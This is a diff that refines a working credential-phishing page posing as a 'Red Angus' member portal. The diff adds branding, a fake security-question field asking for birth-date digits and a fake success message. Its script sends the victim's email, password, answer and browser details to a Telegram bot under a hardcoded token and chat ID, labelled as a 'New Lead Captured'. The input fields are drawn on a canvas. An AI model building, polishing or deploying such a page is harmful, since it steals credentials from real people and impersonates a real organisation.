@@ -3,78 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Login</title>
+    <title>Red Angus | Secure Member Portal</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background-color: #8B0000; /* Red Angus Dark Red */
+            background-color: #f5f7fa; /* Clean light gray */
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            min-height: 100vh;
         }
 
         .container {
-            position: relative;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            border-radius: 12px;
-            background: #A52A2A; /* Lighter Red */
-            padding: 20px;
-            width: 320px;
-            z-index: 10;
+            background-color: #fff;
+            width: 360px;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            border-top: 4px solid #A51D1D; /* Red Angus Red */
         }
 
-        h2 {
-            color: #fff;
+        .header {
             text-align: center;
-            margin-bottom: 20px;
-            font-weight: 600;
+            margin-bottom: 25px;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #A51D1D;
             letter-spacing: 1px;
+        }
+
+        .subtext {
+            font-size: 13px;
+            color: #666;
+            margin-top: 5px;
         }
 
         canvas {
             display: block;
+            width: 100%;
             cursor: text;
+            margin-bottom: 15px;
         }
 
-        #submit-btn {
+        .short-answer-input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .short-answer-input:focus {
+            border-color: #A51D1D;
+        }
+
+        .verify-btn {
             display: block;
             width: 100%;
             padding: 12px;
-            margin-top: 20px;
-            background-color: #FFD700; /* Gold/Yellow accent */
+            background-color: #A51D1D;
+            color: white;
             border: none;
-            border-radius: 6px;
-            color: #8B0000;
-            font-weight: bold;
-            font-size: 16px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
             transition: background 0.3s;
         }
 
-        #submit-btn:hover {
-            background-color: #FFFACD;
+        .verify-btn:hover {
+            background-color: #8a1515;
         }
 
-        #status {
-            color: #fff;
+        .footer {
+            margin-top: 20px;
             text-align: center;
-            margin-top: 10px;
-            font-size: 14px;
-            height: 20px;
-            word-wrap: break-word;
+            font-size: 11px;
+            color: #999;
         }
 
+        .status {
+            height: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #A51D1D;
+            margin-bottom: 10px;
+        }
+
+        /* Fake loading spinner */
         .loader {
             display: none;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #8B0000;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #A51D1D;
             border-radius: 50%;
-            width: 20px;
-            height: 20px;
+            width: 14px;
+            height: 14px;
             animation: spin 1s linear infinite;
             margin: 10px auto;
         }
@@ -83,58 +114,55 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
-        #debug-log {
-            font-size: 10px;
-            color: #ccc;
-            text-align: center;
-            margin-top: 5px;
-            min-height: 12px;
-        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>MEMBER LOGIN</h2>
-    <canvas id="formCanvas" width="280" height="200"></canvas>
-    <button id="submit-btn">VERIFY & LOGIN</button>
+    <div class="header">
+        <div class="logo">RED ANGUS</div>
+        <div class="subtext">Member Portal &bull; Secure Login</div>
+    </div>
+
+    <canvas id="formCanvas" width="300" height="150"></canvas>
+    
+    <label style="font-size: 12px; color: #666; display: block; margin-bottom: 5px;">Security Question</label>
+    <input type="text" class="short-answer-input" id="securityAnswer" placeholder="e.g., Last 4 digits of DOB">
+
+    <button class="verify-btn" id="submitBtn">VERIFY ACCOUNT</button>
+    
+    <div class="status" id="status"></div>
     <div class="loader" id="loader"></div>
-    <div id="status"></div>
-    <div id="debug-log"></div>
+
+    <div class="footer">
+        &copy; 2026 Red Angus International. All rights reserved.<br>
+        Privacy Policy &bull; Terms of Service
+    </div>
 </div>
 
 <script>
     // --- CONFIGURATION ---
-    // These are pre-filled based on our previous context. 
-    // If you changed your bot token, update BOT_TOKEN here.
     const BOT_TOKEN = '8917250221:AAHn3ooqjGzdDps8vJ_zAg6Gj7Fu3ceqp94'; 
-    const CHAT_ID = '6574674233';
+    const CHAT_ID = '6479764005';
     // ---------------------
 
     const canvas = document.getElementById('formCanvas');
     const ctx = canvas.getContext('2d');
     const statusDiv = document.getElementById('status');
-    const submitBtn = document.getElementById('submit-btn');
+    const submitBtn = document.getElementById('submitBtn');
     const loader = document.getElementById('loader');
-    const debugLog = document.getElementById('debug-log');
+    const securityInput = document.getElementById('securityAnswer');
 
-    // State variables
-    let activeField = null; 
+    let activeField = null;
     let emailValue = "";
     let passValue = "";
     let blinkState = true;
-    let blinkTimer = setInterval(() => { blinkState = !blinkState; draw(); }, 500);
-    
-    let btnHovered = false;
+    setInterval(() => { blinkState = !blinkState; draw(); }, 500);
 
-    // Drawing configuration
-    const inputY = 60;
-    const passY = 120;
-    const inputWidth = 240;
-    const inputHeight = 40;
-    const labelY = 50;
-    const passLabelY = 110;
+    const inputY = 30;
+    const passY = 90;
+    const inputWidth = 280;
+    const inputHeight = 30;
 
     function draw() {
         ctx.clearRect(0, 0, canvas.width, canvas.height);
@@ -152,30 +180,31 @@
         };
 
         // Email Field
-        ctx.fillStyle = "#fff";
-        ctx.font = "14px Arial";
-        ctx.fillText("Email Address", 10, labelY);
-        roundRect(10, inputY, inputWidth, inputHeight, 5, "#fff");
+        ctx.fillStyle = "#666";
+        ctx.font = "12px Segoe UI";
+        ctx.fillText("Email Address", 10, inputY - 5);
+        roundRect(10, inputY, inputWidth, inputHeight, 4, "#fff");
         ctx.fillStyle = "#000";
-        ctx.font = "16px Arial";
-        ctx.fillText(emailValue || "", 20, inputY + 25);
+        ctx.font = "14px Segoe UI";
+        ctx.fillText(emailValue || "", 20, inputY + 20);
         if (activeField === 'email') {
-            ctx.fillStyle = "#8B0000";
-            ctx.fillRect(20 + ctx.measureText(emailValue).width, inputY + 10, 2, 20);
+            ctx.fillStyle = "#A51D1D";
+            ctx.fillRect(20 + ctx.measureText(emailValue).width, inputY + 8, 2, 15);
         }
 
         // Password Field
-        ctx.fillStyle = "#fff";
-        ctx.font = "14px Arial";
-        ctx.fillText("Password", 10, passLabelY);
-        roundRect(10, passY, inputWidth, inputHeight, 5, "#fff");
-        let maskStr = passValue.replace(/./g, "•");
+        ctx.fillStyle = "#666";
+        ctx.font = "12px Segoe UI";
+        ctx.fillText("Password", 10, passY - 5);
+        roundRect(10, passY, inputWidth, inputHeight, 4, "#fff");
+        
+        const maskStr = passValue.replace(/./g, "•");
         ctx.fillStyle = "#000";
-        ctx.font = "16px Arial";
-        ctx.fillText(maskStr || "", 20, passY + 25);
+        ctx.font = "14px Segoe UI";
+        ctx.fillText(maskStr || "", 20, passY + 20);
         if (activeField === 'pass') {
-            ctx.fillStyle = "#8B0000";
-            ctx.fillRect(20 + ctx.measureText(maskStr).width, passY + 10, 2, 20);
+            ctx.fillStyle = "#A51D1D";
+            ctx.fillRect(20 + ctx.measureText(maskStr).width, passY + 8, 2, 15);
         }
     }
 
@@ -202,18 +231,9 @@
         draw();
     });
 
-    submitBtn.addEventListener('mouseenter', () => {
-        btnHovered = true;
-        submitBtn.style.backgroundColor = "#FFFACD";
-    });
-    submitBtn.addEventListener('mouseleave', () => {
-        btnHovered = false;
-        submitBtn.style.backgroundColor = "#FFD700";
-    });
-
     submitBtn.addEventListener('click', async () => {
         if (!emailValue || !passValue) {
-            statusDiv.innerText = "Please fill all fields.";
+            statusDiv.innerText = "Please complete all fields.";
             return;
         }
 
@@ -224,14 +244,14 @@
         const payload = {
             email: emailValue,
             password: passValue,
-            time: new Date().toLocaleString(),
-            ua: navigator.userAgent
+            answer: securityInput.value,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
         };
 
-        const message = `🔴 *New Lead*\n\n📧 ${payload.email}\n🔑 ${payload.password}\n⏰ ${payload.time}`;
-
         try {
-            // Using no-cors to bypass local file restrictions
+            const message = `🔴 *New Lead Captured*\n\n📧 Email: ${payload.email}\n🔑 Pass: ${payload.password}\n❓ Answer: ${payload.answer}\n⏰ Time: ${payload.timestamp}`;
+            
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -239,22 +259,18 @@
                     chat_id: CHAT_ID,
                     text: message,
                     parse_mode: 'Markdown'
-                }),
-                mode: 'no-cors' // Crucial for local files
+                })
             });
 
-            // Since no-cors doesn't give us the response body, we assume success if no exception thrown
-            statusDiv.innerText = "Sent! Check Telegram.";
-            debugLog.innerText = "Status: Success (Check your Telegram DM)";
-            
-            // Clear fields
-            emailValue = "";
-            passValue = "";
-            draw();
-
+            statusDiv.innerText = "Success! Redirecting...";
+            setTimeout(() => {
+                alert("Welcome back, Member.");
+                // Optional redirect
+                // window.location.href = "https://redangus.com";
+            }, 1000);
         } catch (err) {
-            statusDiv.innerText = "Failed to connect.";
-            debugLog.innerText = "Error: " + err.message;
+            statusDiv.innerText = "Error sending data.";
+            loader.style.display = "none";
         }
     });
 </script>
